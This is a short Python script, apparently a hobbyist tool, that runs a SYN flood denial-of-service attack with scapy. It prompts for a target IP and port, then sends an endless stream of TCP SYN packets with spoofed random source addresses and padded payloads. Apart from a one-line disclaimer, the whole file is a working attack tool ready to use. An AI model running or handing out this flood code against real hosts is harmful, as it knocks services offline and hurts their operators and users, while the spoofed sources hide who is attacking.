# coding: utf-8

from scapy.all import *
from colorama import *

print(Fore.GREEN + "[*] SYN FLOOD ATTACK")
print(Fore.RED + "[***]  Don't use this script for illegal purposes ! [***]")
print("")
target_IP = raw_input("[*] traget_IP >>> ")
target_port = raw_input("[*] target_port >>> ")
Theport = int(target_port)
while True:
	send(IP(src=RandIP(),dst=target_IP)/TCP(sport=RandShort(),dport=Theport,flags="S",seq=1505066)/Raw(b"XX"*1024))
